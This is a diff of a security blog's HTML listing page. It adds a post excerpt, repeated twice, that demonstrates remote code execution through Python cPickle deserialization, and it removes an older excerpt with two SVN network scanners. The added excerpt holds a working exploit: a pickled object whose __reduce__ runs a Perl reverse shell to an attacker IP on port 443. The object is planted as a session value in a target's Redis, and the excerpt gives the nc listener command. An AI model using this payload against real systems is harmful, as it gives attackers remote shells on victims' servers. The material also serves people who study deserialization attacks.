@@ -117,6 +117,96 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2016/07/26/python-cpickle-shell.html" >Python cPickle 反序列化shell</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2016-07-26  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>利用Python cPickle反序列化反弹shell，主要利用cPicle的<code>__reduce__</code>，在反序列化的时候自动执行，官方文档有如下：</p>
+<blockquote>
+<p>When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:</p>
+</blockquote>
+<p>   A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.</p>
+<p> <code>__reduce__</code>的返回值，第一个作为<code>callable object</code>，第二个作为参数调用，所以可以有如下反弹shell的方法:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
+import cPickle
+import os
+import redis
+
+class exp(object):
+    def __reduce__(self):
+        s &#x3D; &quot;&quot;&quot; perl -e &#39;use Socket;$i&#x3D;&quot;xx.xx.xx.xx&quot;;$p&#x3D;443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;&#39;&quot;&quot;&quot;
+        return (os.system, (s,))
+   
+e &#x3D; exp()
+s &#x3D; cPickle.dumps(e)
+
+r &#x3D; redis.Redis(host&#x3D;&#39;xxx.xxx.xxx.xxx&#39;, port&#x3D;6379, db&#x3D;0)
+r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>执行之后，向目标IP写入key为b026324c6904b2a9cb4b88d6d61c81d1，其值是序列化的字符串，__reduce__函数可以反弹shell的session。<br>反弹shell指定端口 <code>nc -l -vv -p 443</code><br>然后到redis页面设置session_id，刷新之后即可反弹。</p>
+
+	
+
+	</div>
+  <a type="button" href="/2016/07/26/python-cpickle-shell.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>利用Python cPickle反序列化反弹shell，主要利用cPicle的<code>__reduce__</code>，在反序列化的时候自动执行，官方文档有如下：</p>
+<blockquote>
+<p>When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:</p>
+</blockquote>
+<p>   A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.</p>
+<p> <code>__reduce__</code>的返回值，第一个作为<code>callable object</code>，第二个作为参数调用，所以可以有如下反弹shell的方法:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></li>
+</ul>
+<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
+import cPickle
+import os
+import redis
+
+class exp(object):
+    def __reduce__(self):
+        s &#x3D; &quot;&quot;&quot; perl -e &#39;use Socket;$i&#x3D;&quot;xx.xx.xx.xx&quot;;$p&#x3D;443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;&#39;&quot;&quot;&quot;
+        return (os.system, (s,))
+   
+e &#x3D; exp()
+s &#x3D; cPickle.dumps(e)
+
+r &#x3D; redis.Redis(host&#x3D;&#39;xxx.xxx.xxx.xxx&#39;, port&#x3D;6379, db&#x3D;0)
+r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>执行之后，向目标IP写入key为b026324c6904b2a9cb4b88d6d61c81d1，其值是序列化的字符串，__reduce__函数可以反弹shell的session。<br>反弹shell指定端口 <code>nc -l -vv -p 443</code><br>然后到redis页面设置session_id，刷新之后即可反弹。</p>
+
+	
+	</div>
+  <a type="button" href="/2016/07/26/python-cpickle-shell.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2016/07/25/hash-length-attack.html" >MD5哈希长度扩展攻击</a>
 		</h3>
 		</div>
@@ -383,228 +473,6 @@
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2016/04/15/svn-scan.html" >SVN匿名扫描</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2016-04-15  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>程序是最开始学习Python写的，基本是东拼西凑，从这个程序开始接触多进程。有两个版本第一种是直接使用<code>sock</code>的<code>connect</code>连接来判断，第二种使用了<code>scapy</code>，本着追求最快的程序，结果使用<code>scapy</code>比<code>socket</code>要慢好多。</p>
-<p>下面是第一个程序，使用<code>socket</code>扫描:</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
-<span class="token comment"># -*-coding:utf-8-*-</span>
-
-<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span>PIPE
-<span class="token keyword">import</span> re
-<span class="token keyword">from</span> netaddr <span class="token keyword">import</span> IPNetwork
-<span class="token keyword">import</span> socket
-<span class="token keyword">from</span> Queue <span class="token keyword">import</span> Queue
-<span class="token keyword">import</span> threading
-<span class="token keyword">import</span> time
-<span class="token keyword">import</span> os
-
-iplist <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>IPNetwork<span class="token punctuation">(</span><span class="token string">'1.2.3.4/24'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">svn_scan</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
-            s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
-            s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
-            <span class="token keyword">if</span> s<span class="token punctuation">.</span>connect_ex<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3690</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
-                p <span class="token operator">=</span> Popen<span class="token punctuation">(</span><span class="token string">"svn info svn://"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stdin<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>
-                <span class="token punctuation">(</span>out<span class="token punctuation">,</span> err<span class="token punctuation">)</span> <span class="token operator">=</span> p<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>
-                <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'UUID'</span><span class="token punctuation">,</span> out<span class="token punctuation">)</span><span class="token punctuation">:</span>
-                     <span class="token keyword">print</span> ip
-            s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-
-<span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">while</span> <span class="token keyword">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-       ip <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
-       <span class="token keyword">try</span><span class="token punctuation">:</span>
-            svn_scan<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
-       <span class="token keyword">finally</span><span class="token punctuation">:</span>
-            q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span>
-start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token builtin">map</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span>put<span class="token punctuation">,</span>iplist<span class="token punctuation">)</span>
-    threads <span class="token operator">=</span> <span class="token punctuation">[</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>worker<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
-    <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> threads<span class="token punctuation">)</span>
-    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">print</span> <span class="token string">'need time %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<p>然后是使用了<code>scapy</code>的<code>syn</code>扫描：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
-<span class="token keyword">import</span> logging
-logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">"scapy.runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span> <span class="token comment">#关闭import scapy的警告</span>
-<span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>
-<span class="token keyword">from</span> netaddr <span class="token keyword">import</span> IPNetwork
-<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span> PIPE
-<span class="token keyword">import</span> re
-<span class="token keyword">import</span> time
-<span class="token keyword">from</span> Queue <span class="token keyword">import</span> Queue
-<span class="token keyword">import</span> threading
-
-conf<span class="token punctuation">.</span>verb <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">#关闭输出</span>
-targets <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>IPNetwork<span class="token punctuation">(</span><span class="token string">'1.2.3.4/24'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">svn_scan</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    ans <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>target<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">3690</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>
-    <span class="token keyword">if</span> ans <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
-        <span class="token keyword">pass</span>
-    <span class="token keyword">elif</span> ans<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">if</span> ans<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token number">18</span><span class="token punctuation">:</span>
-            sr<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>target<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">3690</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"RA"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.01</span><span class="token punctuation">)</span>
-            p <span class="token operator">=</span> Popen<span class="token punctuation">(</span><span class="token string">"svn info svn://"</span> <span class="token operator">+</span> target<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stdin<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>
-            out<span class="token punctuation">,</span> err <span class="token operator">=</span> p<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>
-            <span class="token keyword">if</span>   re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'UUID'</span><span class="token punctuation">,</span> out<span class="token punctuation">)</span> <span class="token punctuation">:</span>
-                <span class="token keyword">print</span> target
-
-<span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">while</span> <span class="token keyword">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        item <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
-        <span class="token keyword">try</span><span class="token punctuation">:</span>
-            svn_scan<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>
-        <span class="token keyword">finally</span><span class="token punctuation">:</span>
-            q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span> 
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token builtin">map</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span>put<span class="token punctuation">,</span> targets<span class="token punctuation">)</span>
-    threads <span class="token operator">=</span> <span class="token punctuation">[</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>worker<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
-    <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> threads<span class="token punctuation">)</span>
-    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">print</span> <span class="token string">'need time %s'</span> <span class="token operator">%</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>====2017-12-15更新</p>
-<p>关于多线程，上面两个的<code>q.join</code>写错了，删掉之后改为:</p>
-<pre class="line-numbers language-none"><code class="language-none">map(lambda x: x.join(), threads)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p>扫描<code>/24</code>的主机，花费的时间从8s变为了0.5s，时间不是这么计算的。</p>
-<p>如果上面没有设置线程的daemon，最后运行的时候会一直卡着，因为进程默认不会停的，要这样:</p>
-	
-
-	</div>
-  <a type="button" href="/2016/04/15/svn-scan.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>程序是最开始学习Python写的，基本是东拼西凑，从这个程序开始接触多进程。有两个版本第一种是直接使用<code>sock</code>的<code>connect</code>连接来判断，第二种使用了<code>scapy</code>，本着追求最快的程序，结果使用<code>scapy</code>比<code>socket</code>要慢好多。</p>
-<p>下面是第一个程序，使用<code>socket</code>扫描:</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
-<span class="token comment"># -*-coding:utf-8-*-</span>
-
-<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span>PIPE
-<span class="token keyword">import</span> re
-<span class="token keyword">from</span> netaddr <span class="token keyword">import</span> IPNetwork
-<span class="token keyword">import</span> socket
-<span class="token keyword">from</span> Queue <span class="token keyword">import</span> Queue
-<span class="token keyword">import</span> threading
-<span class="token keyword">import</span> time
-<span class="token keyword">import</span> os
-
-iplist <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>IPNetwork<span class="token punctuation">(</span><span class="token string">'1.2.3.4/24'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">svn_scan</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">:</span>
-            s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
-            s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
-            <span class="token keyword">if</span> s<span class="token punctuation">.</span>connect_ex<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3690</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
-                p <span class="token operator">=</span> Popen<span class="token punctuation">(</span><span class="token string">"svn info svn://"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stdin<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>
-                <span class="token punctuation">(</span>out<span class="token punctuation">,</span> err<span class="token punctuation">)</span> <span class="token operator">=</span> p<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>
-                <span class="token keyword">if</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'UUID'</span><span class="token punctuation">,</span> out<span class="token punctuation">)</span><span class="token punctuation">:</span>
-                     <span class="token keyword">print</span> ip
-            s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-
-<span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">while</span> <span class="token keyword">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-       ip <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
-       <span class="token keyword">try</span><span class="token punctuation">:</span>
-            svn_scan<span class="token punctuation">(</span>ip<span class="token punctuation">)</span>
-       <span class="token keyword">finally</span><span class="token punctuation">:</span>
-            q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span>
-start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token builtin">map</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span>put<span class="token punctuation">,</span>iplist<span class="token punctuation">)</span>
-    threads <span class="token operator">=</span> <span class="token punctuation">[</span>threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>worker<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
-    <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> threads<span class="token punctuation">)</span>
-    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token keyword">print</span> <span class="token string">'need time %s'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<p>然后是使用了<code>scapy</code>的<code>syn</code>扫描：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span>
-<span class="token keyword">import</span> logging
-logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">"scapy.runtime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span> <span class="token comment">#关闭import scapy的警告</span>
-<span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>
-<span class="token keyword">from</span> netaddr <span class="token keyword">import</span> IPNetwork
-<span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span> PIPE
-<span class="token keyword">import</span> re
-<span class="token keyword">import</span> time
-<span class="token keyword">from</span> Queue <span class="token keyword">import</span> Queue
-<span class="token keyword">import</span> threading
-
-conf<span class="token punctuation">.</span>verb <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment">#关闭输出</span>
-targets <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>IPNetwork<span class="token punctuation">(</span><span class="token string">'1.2.3.4/24'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-start <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token keyword">def</span> <span class="token function">svn_scan</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    ans <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>target<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">3690</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.5</span><span class="token punctuation">)</span>
-    <span class="token keyword">if</span> ans <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
-        <span class="token keyword">pass</span>
-    <span class="token keyword">elif</span> ans<span class="token punctuation">.</span>haslayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">if</span> ans<span class="token punctuation">.</span>getlayer<span class="token punctuation">(</span>TCP<span class="token punctuation">)</span><span class="token punctuation">.</span>flags <span class="token operator">==</span> <span class="token number">18</span><span class="token punctuation">:</span>
-            sr<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span>target<span class="token punctuation">)</span><span class="token operator">/</span>TCP<span class="token punctuation">(</span>dport<span class="token operator">=</span><span class="token number">3690</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token string">"RA"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">0.01</span><span class="token punctuation">)</span>
-            p <span class="token operator">=</span> Popen<span class="token punctuation">(</span><span class="token string">"svn info svn://"</span> <span class="token operator">+</span> target<span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>PIPE<span class="token punctuation">,</span> stdin<span class="token operator">=</span>PIPE<span class="token punctuation">)</span>
-            out<span class="token punctuation">,</span> err <span class="token operator">=</span> p<span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span>
-            <span class="token keyword">if</span>   re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'UUID'</span><span class="token punctuation">,</span> out<span class="token punctuation">)</span> <span class="token punctuation">:</span>
-                <span class="token keyword">print</span> target
-
-<span class="token keyword">def</span> <span class="token function">worker</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">while</span> <span class="token keyword">not</span> q<span class="token punctuation">.</span>empty<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        item <span class="token operator">=</span> q<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span>
-        <span class="token keyword">try</span><span class="token punctuation">:</span>
-            svn_scan<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">)</span>
-        <span class="token keyword">finally</span><span class="token punctuation">:</span>
-            q<span class="token punctuation">.</span>task_done<span class="token punctuation">(</span><span class="token punctuation">)</span> 
-<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
-    q <span class="token operator">=</span> Queue<span class="token punctuation">(</span><span class="token punctuation">)</span>
-    <span class="token builtin">map</span><span class="token punctuation">(</span>q<span class="token punctuation">.</span>put<span class="token punctuation">,</span> targets<span class="token punctuation">)</span>
-    threads <span class="token operator">=</span> <span class="token punctuation">[</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>worker<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
-    <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> threads<span class="token punctuation">)</span>
-    q<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>
